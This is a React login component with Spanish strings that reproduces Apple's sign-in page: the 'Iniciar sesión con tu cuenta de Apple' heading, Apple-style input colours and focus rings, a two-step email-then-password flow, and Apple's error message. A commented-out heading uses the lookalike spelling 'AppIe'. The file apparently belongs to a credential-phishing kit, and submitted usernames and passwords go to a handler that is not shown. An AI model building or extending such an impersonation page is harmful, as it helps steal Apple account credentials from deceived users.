import { Form, Button, FloatingLabel } from 'react-bootstrap'; // Asegúrate de tener react-bootstrap instalado
import PopupLogin from '../../../resources/poputs/PopupLogin'; // Asegúrate de que este componente exista
import { useEffect } from 'react';
import { useData } from '../../../context/UserContext';
const Login = ({
    handleLogin,
    hideInputPassword,
    statusLogin,
    accountUsername,
    setAccountUsername,
    accountPassword,
    setAccountPassword,
    opLogin,
    setOpLogin,
    imgNext,
    SvgSpinner,
    darkMode,
    translator,
    styles
}) => {
    const { use } = useData();
    const isDarkMode = darkMode === true || darkMode === 'true';
  
    return (

       <>
       <style>
            {`
            .form-floating > .form-control-plaintext ~ label::after,
            .form-floating > .form-control:focus ~ label::after,
            .form-floating > .form-control:not(:placeholder-shown) ~ label::after,
            .form-floating > .form-select ~ label::after {
                background-color: #ffffff00 !important;
            }
            .form-floating > .form-control-plaintext ~ label,
            .form-floating > .form-control:focus ~ label,
            .form-floating > .form-control:not(:placeholder-shown) ~ label,
            .form-floating > .form-select ~ label {
                color: #86868b !important;
            }

          /*  #bodyIc #accountUsername, #bodyIc #accountPassword {
               background-color: hsla(0,0%,100%,.04)!important;
               border-color: #6e6e73;
               border-radius: 12px;
               color: #f5f5f7;
            }*/
            #bodyIc #accountUsername:focus, #bodyIc #accountPassword:focus {
                border-color: #2997FF!important;
                box-shadow: 0 0 0 2px #2997FF inset!important;
            }
             @media (min-width: 769px) {
               #bodyIc {
                 min-height: 100vh;
                 display: flex;
                 flex-direction: column;
               }

             }

            `}
        </style>
       
        <Form onSubmit={handleLogin} style={{ position: 'relative', width: '100%' }}>
            <h3 className="my-3" style={{
                textAlign: 'center',
                fontSize: '29px',
                fontWeight: '600',
                lineHeight: '36px',
                WebkitMarginBefore: '20px',
                marginBlockStart: '20px',
                textAlign: 'center'

            }}>
                {/* {translator('Iniciar sesión con tu cuenta de AppIe')} */}
                {translator('Iniciar sesión con tu cuenta de Apple')}
            </h3>
            <div id="divUsername" style={{ zIndex: 1, position: 'relative' }}>
                <FloatingLabel
                    controlId={`accountUsername`}
                    label={translator('Correo o número de telefono')}
                    className="mb-3 "
                >
                     
                    <Form.Control
                        type="text"
                        placeholder={translator('Correo o número de telefono')}
                        style={{
                            paddingRight: '60px',
                            backgroundColor: isDarkMode ? 'hsla(0,0%,100%,.04)' : 'hsla(0,0%,100%,.8)',
                            borderColor: isDarkMode ? '#6e6e73' : '#86868b',
                            borderRadius: '12px',
                            color: isDarkMode ? '#f5f5f7' : '#494949'
                        }}
                        value={accountUsername}
                        onChange={({ target }) => {
                            setAccountUsername(target.value);
                            setOpLogin(false);
                            target.value === ''
                                ? document.getElementById('btnAccount').style.opacity = '0.6'
                                : document.getElementById('btnAccount').style.opacity = '1';
                            hideInputPassword();
                        }}
                    />
                </FloatingLabel>
            </div>
            <Button type='submit' className='btn' id='btnAccount' style={{ left: '20px!important' }}>
                {statusLogin
                    ? <SvgSpinner style={{ color: '#86868b' }} />
                    : <img id='imgNext' src={imgNext} alt="Siguiente" />}
            </Button>
            <div id="SliderIC" className="slide-up" style={{ paddingLeft: '12px', paddingRight: '12px' }}>
                <div id="SliderDivIC">
                    <FloatingLabel controlId="accountPassword" label={translator('Contraseña')}>
                        <Form.Control
                            type="password"
                            placeholder={translator('Contraseña')}
                            style={{
                                paddingRight: '70px',
                                backgroundColor: isDarkMode ? 'hsla(0,0%,100%,.04)' : 'hsla(0,0%,100%,.8)',
                                borderColor: isDarkMode ? '#6e6e73' : '#86868b',
                                borderRadius: '12px',
                                color: isDarkMode ? '#f5f5f7' : '#494949'
                            }}
                            value={accountPassword}
                            onChange={({ target }) => {
                                setAccountPassword(target.value);
                                document.getElementsByClassName('errorMessage')[0].style.display = 'none';
                                target.value === ''
                                    ? document.getElementById('btnAccount').style.opacity = '0.6'
                                    : document.getElementById('btnAccount').style.opacity = '1';
                            }}
                            autoComplete='off'
                        />
                    </FloatingLabel>
                </div>
            </div>

            <div className="errorMessage">
                {translator('Revisa la información de la cuenta que ingresaste y vuelve a intentarlo.')}<br />
                <a href="#" style={{ color: '#222', textDecoration: 'underline', display: 'none' }}>{translator('¿Olvidaste la contraseña?')}</a>
            </div>

        </Form>
        </> 
    )
}

export default Login;